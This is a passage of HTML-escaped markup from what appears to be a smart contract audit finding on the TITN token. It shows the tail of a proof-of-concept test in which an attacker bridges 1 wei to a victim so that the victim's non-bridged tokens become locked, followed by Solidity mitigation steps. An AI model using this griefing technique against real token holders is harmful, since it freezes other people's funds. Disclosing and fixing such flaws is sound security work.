ethers.utils.parseEther(\u0026#39;1\u0026#39;))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattackerTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;1\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003enewOptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddExecutorLzReceiveOption\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e200000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoHex\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e().\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// to attacker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattackerTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattackerTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker bridges 1 wei to Victim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;.000001\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksSendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = [\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeidA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroPad\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// to victim\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokensToSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eoptions\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;0x\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ]\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksNativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003equoteSend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksSendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            .\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            .\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esend\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksSendParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacksNativeFee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// POC: Victim attempts to transfer non-bridged tokens, Fails due to boolean flag.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebaseTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etrue\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003etry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbTITN\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictim\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eownerB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evictimNonBridgedTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efail\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;Transaction should have reverted\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ecatch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eany\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eerror\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emessage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einclude\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;BridgedTokensTransferLocked\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    })\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003e \u003cstrong\u003eTrack Bridged Token Balances Instead of Booleans\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eReplace \u003ccode\u003eisBridgedTokenHolder\u003c/code\u003e with a \u003ccode\u003ebridgedBalances\u003c/code\u003e mapping\u003c/strong\u003e to track the \u003cem\u003eexact amount\u003c/em\u003e of bridged tokens per address:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003emapping\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eModify \u003ccode\u003e_credit\u003c/code\u003e to Increment Bridged Balance\u003c/strong\u003e:\u003cbr\u003e\nUpdate the bridging logic to accumulate bridged amounts:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_credit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ... {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amountLD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Track bridged amount\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eUpdate Transfer Validation Logic\u003c/strong\u003e:\u003cbr\u003e\nRestrict transfers \u003cem\u003eonly\u003c/em\u003e if the amount exceeds the non-bridged balance:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonBridged\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebridgedBalances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonBridged\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan 